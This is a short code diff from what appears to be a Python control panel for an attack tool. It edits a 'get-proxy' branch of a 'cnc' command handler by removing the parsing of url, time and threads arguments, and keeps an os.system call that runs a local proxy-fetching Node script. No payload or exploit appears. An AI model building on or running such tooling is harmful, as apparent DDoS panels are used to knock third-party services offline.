@@ -268,9 +268,6 @@ def main():
 
         elif "get-proxy" in cnc:
             try:
-                url = cnc.split()[1]
-                time = cnc.split()[2]
-                threads = cnc.split()[3]
                 os.system(f'node getproxy.js')
             except IndexError:
                 print('proxy recieved')
